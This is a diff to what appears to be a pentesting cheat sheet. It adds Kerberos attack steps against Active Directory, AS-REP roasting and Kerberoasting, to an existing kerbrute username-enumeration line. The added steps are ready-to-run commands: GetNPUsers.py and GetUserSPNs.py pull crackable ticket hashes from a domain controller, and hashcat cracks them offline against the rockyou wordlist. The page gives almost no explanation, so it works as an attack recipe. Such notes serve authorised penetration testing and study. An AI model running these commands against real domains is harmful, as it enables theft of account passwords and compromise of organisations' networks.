@@ -16,10 +16,25 @@ kerbrute userenum /usr/share/wordlists/seclists/Usernames/Names/names.txt -d $do
 ```
 {% endcode %}
 
-### UF DONT REQUIRE PREAUTH
+### Asreproasting
+
+_UF DONT REQUIRE PREAUTH_
 
 {% code overflow="wrap" %}
 ```
 GetNPUsers.py $domain/ -no-pass -usersfile /path/to/names.txt -dc-ip $ip
 ```
 {% endcode %}
+
+```
+hashcat -d 2 krb5asrep.txt -m 18200 -a 0 /usr/share/wordlists/rockyou.txt
+```
+
+### Kerberoasting
+
+```
+python3 /usr/local/bin/GetUserSPNs.py domain.com/user:password -dc-ip $ip -request
+```
+
+<pre><code><strong>hashcat -d 2 krb5tgs.txt -m 13100 -a 0 /usr/share/wordlists/rockyou.txt
+</strong></code></pre>
